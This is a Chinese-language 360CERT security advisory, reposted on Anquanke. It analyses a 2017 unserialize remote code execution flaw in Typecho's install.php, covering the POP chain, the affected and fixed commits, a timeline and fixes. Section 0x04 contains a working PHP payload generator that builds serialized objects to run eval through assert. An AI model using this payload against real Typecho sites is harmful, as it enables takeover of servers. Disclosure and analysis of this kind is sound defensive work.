# 【漏洞分析】typecho前台GETSHELL分析预警

阅读量 **162542**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-10-26 15:27:28

 **x**

##### 译文声明

本文是翻译文章，文章来源：安全客

译文仅供参考，具体内容表达以及含义原文为准。

**0x00 背景介绍**

2017年10月24日，typecho被爆出 **install.php** 页面存在 **反序列化任意命令执行漏洞，危害广泛**

**0x01 漏洞概述**

**install.php** 一处if判断里 **直接处理了用户传入的序列化字符串** ，以及可以在现有框架中寻找到一条完整的pop执行链
导致任意php命令执行

**0x02 漏洞攻击面影响**

**1\. 影响面**

几乎市面上的 **未及时更新的所有typecho都受到该漏洞影响**

**2\. 影响版本**

git commit 242fc1a4cb3d6076505f851fdcd9c1bbf3e431a5

之前的几乎所有版本

**3\. 修复版本**

git commit e277141c974cd740702c5ce73f7e9f382c18d84e

以后的commit

**0x03 漏洞详情**

**1\. 漏洞代码**

这里可以预想，应该不会有显然在 **__constract()** 中写出危险操作的开发吧

所以把思路转向字符串拼接的时候

寻找下 **__toString()**

其实只有三个class有这个 **__toString()**

    
    
    var/Typecho/Feed.php
    var/Typecho/Config.php
    var/Typecho/Db/Query.php

这里面大致出现了如下几种调用

    
    
    $item['xxx']
    $item['xxx']->$yyyy
    $this->

从这个点可以有些新的思考

因为是反序列化，对象中的属性也是我们可以控制的，那么现在去找找 **__get()** 方法

    
    
    class Typecho_Config implements Iterator
    class IXR_Client
    class Typecho_Plugin
    class Widget_Themes_Edit extends Widget_Abstract_Options implements Widget_Interface_Do
    class Typecho_Date
    class Typecho_Request
    abstract class Typecho_Widget
    class Typecho_Widget_Helper_Layout

有这么些个函数是带有 **__get()** 方法的

有这么一处完整不经过变化处理的

然后直接由 **call_user_func** 执行构造好的指定代码

**0x04攻击利用分析**

**1\. Payload生成**

    
    
    <?php
    class Typecho_Request
    {
        private $_params = array('screenName'=>'eval('phpinfo();exit();')');
        private $_filter = array('assert');
    }
    $payload1 = new Typecho_Request();
    class Typecho_Feed
    {
        private $_type = 'RSS 2.0';
        private $_items;
        public function __construct($x1)
        {
            $this->_items[] = array('author'=>$x1);
        }
    }
    $payload2 = new Typecho_Feed($payload1);
    $exp['adapter'] = $payload2;
    $exp['prefix'] = 'c1tas';
    echo base64_encode(serialize($exp));

**0x05 漏洞利用验证**

**0x06 修复建议**

及时同步官方分支

注释掉 **install.php** 相关代码

**0x07 时间线**

2017-10-24 typecho官方更新commit修复漏洞

2017-10-25 360CERT完成分析报告

2017-10-26 360CERT发布分析报告

**0x08 参考文档**

typecho“后门”分析: <http://paper.tuisec.win/detail/3e924e55456f065.jsp>

php自动调用: <http://www.cnblogs.com/shirui/p/4767994.html>

php反序列化: <http://bobao.360.cn/learning/detail/4122.html>

本文翻译自安全客 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **360CERT安全通告** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/87087](/post/id/87087)

安全客 - 有思想的安全新媒体

本文转载自: [安全客]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p1.ssl.qhmsg.com/dm/200_200_100/t013be54b59d8ac5fe6.jpg)
360CERT安全通告

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

